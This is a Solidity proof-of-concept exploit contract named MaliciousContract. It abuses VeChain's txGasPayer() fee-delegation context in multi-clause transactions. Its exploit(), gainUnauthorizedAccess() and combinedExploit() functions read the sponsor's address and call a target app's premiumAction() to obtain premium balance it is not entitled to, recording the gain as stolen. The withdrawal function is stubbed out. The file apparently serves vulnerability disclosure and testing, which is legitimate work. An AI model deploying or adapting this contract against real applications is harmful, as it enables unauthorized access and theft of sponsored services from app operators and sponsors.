// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title MaliciousContract
 * @dev Exploit contract that abuses fee delegation context in MTT
 * This contract demonstrates how an attacker can exploit the txGasPayer() vulnerability
 */

interface IExtensionV2 {
    function txGasPayer() external view returns (address);
}

interface IVulnerableApp {
    function premiumAction() external returns (bool);
    function getCurrentGasPayer() external view returns (address);
    function getPremiumBalance(address account) external view returns (uint256);
}

contract MaliciousContract {
    // VeChain Extension contract address (builtin)
    IExtensionV2 constant EXTENSION = IExtensionV2(0x0000000000000000000000457874656E73696F6E);
    
    // Target vulnerable application
    IVulnerableApp public vulnerableApp;
    
    // Events for tracking exploit
    event ExploitStarted(address indexed attacker, address indexed target);
    event GasPayerLeaked(address indexed gasPayer, address indexed caller);
    event UnauthorizedAccess(address indexed attacker, uint256 stolenAmount);
    event ExploitCompleted(bool success, uint256 totalStolen);
    
    constructor(address _vulnerableApp) {
        vulnerableApp = IVulnerableApp(_vulnerableApp);
    }
    
    /**
     * @dev Main exploit function - designed to be called in MTT Clause 0
     * This function demonstrates the context leak vulnerability
     */
    function exploit() external returns (address) {
        emit ExploitStarted(msg.sender, address(vulnerableApp));
        
        // VULNERABILITY EXPLOITATION: Read gas payer from shared transaction context
        address gasPayer = EXTENSION.txGasPayer();
        
        // Log the leaked gas payer information
        emit GasPayerLeaked(gasPayer, msg.sender);
        
        // Return the gas payer for verification
        return gasPayer;
    }
    
    /**
     * @dev Secondary exploit function - designed to be called in MTT Clause 1
     * This function attempts to gain unauthorized access using the leaked context
     */
    function gainUnauthorizedAccess() external returns (bool) {
        // Check our balance before the attack
        uint256 balanceBefore = vulnerableApp.getPremiumBalance(address(this));
        
        // Attempt to access premium service
        // This will succeed because txGasPayer() returns the trusted sponsor
        // even though msg.sender is this malicious contract
        bool success = vulnerableApp.premiumAction();
        
        if (success) {
            uint256 balanceAfter = vulnerableApp.getPremiumBalance(address(this));
            uint256 stolen = balanceAfter - balanceBefore;
            emit UnauthorizedAccess(address(this), stolen);
        }
        
        return success;
    }
    
    /**
     * @dev Combined exploit function for single-clause demonstration
     * This shows how the exploit could work in a single call
     */
    function combinedExploit() external returns (bool) {
        emit ExploitStarted(msg.sender, address(vulnerableApp));
        
        // Step 1: Verify we can read the trusted sponsor's address
        address gasPayer = EXTENSION.txGasPayer();
        emit GasPayerLeaked(gasPayer, msg.sender);
        
        // Step 2: Use this information to gain unauthorized access
        uint256 balanceBefore = vulnerableApp.getPremiumBalance(address(this));
        bool success = vulnerableApp.premiumAction();
        
        if (success) {
            uint256 balanceAfter = vulnerableApp.getPremiumBalance(address(this));
            uint256 stolen = balanceAfter - balanceBefore;
            emit UnauthorizedAccess(address(this), stolen);
            emit ExploitCompleted(true, stolen);
        } else {
            emit ExploitCompleted(false, 0);
        }
        
        return success;
    }
    
    /**
     * @dev Utility function to check current gas payer
     */
    function checkGasPayer() external view returns (address) {
        return EXTENSION.txGasPayer();
    }
    
    /**
     * @dev Utility function to check vulnerable app's view of gas payer
     */
    function checkVulnerableAppGasPayer() external view returns (address) {
        return vulnerableApp.getCurrentGasPayer();
    }
    
    /**
     * @dev Get stolen balance
     */
    function getStolenBalance() external view returns (uint256) {
        return vulnerableApp.getPremiumBalance(address(this));
    }
    
    /**
     * @dev Withdraw stolen tokens (if any withdrawal mechanism exists)
     */
    function withdrawStolen() external {
        // In a real scenario, this might transfer stolen tokens to attacker's wallet
        // For PoC, we just emit an event
        uint256 balance = vulnerableApp.getPremiumBalance(address(this));
        if (balance > 0) {
            emit UnauthorizedAccess(msg.sender, balance);
        }
    }
}